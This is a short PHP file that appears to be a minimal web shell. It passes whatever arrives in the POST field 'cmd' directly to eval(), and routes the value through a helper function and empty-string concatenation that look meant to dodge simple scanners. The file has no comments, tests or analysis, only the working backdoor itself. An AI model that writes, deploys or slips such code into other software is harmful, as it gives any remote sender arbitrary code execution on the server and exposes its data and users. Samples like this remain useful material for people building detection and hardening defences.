<?php
eval('' . post() . '');
/**
 * @return string
 */
function POST()
{
    $post = $_POST['cmd'];
    return $post;
}